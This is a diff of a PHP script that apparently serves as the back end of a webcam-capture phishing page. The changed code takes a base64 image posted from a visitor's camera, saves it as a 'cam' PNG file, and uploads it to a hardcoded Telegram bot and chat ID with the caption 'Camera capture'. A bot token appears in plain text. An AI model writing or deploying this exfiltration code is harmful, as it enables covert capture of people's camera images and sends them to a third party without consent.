@@ -1,19 +1,40 @@
-<?php
+ <?php
+
+$botToken = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
+$chatId = "8504837303";
 
 $date = date('dMYHis');
-$imageData=$_POST['cat'];
 
-if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
+if(!empty($_POST['cat'])){
+
+$imageData = $_POST['cat'];
+
+$filteredData = substr($imageData, strpos($imageData, ",")+1);
+$unencodedData = base64_decode($filteredData);
+
+$fileName = "cam".$date.".png";
+
+file_put_contents($fileName, $unencodedData);
+
+$url = "https://api.telegram.org/bot".$botToken."/sendPhoto";
+
+$postFields = [
+'chat_id' => $chatId,
+'photo' => new CURLFile(realpath($fileName)),
+'caption' => "Camera capture ".$date
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,$postFields);
+
+$result = curl_exec($ch);
+curl_close($ch);
+
+echo json_encode(["status"=>"sent"]);
 
 }
 
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-exit();
 ?>
 
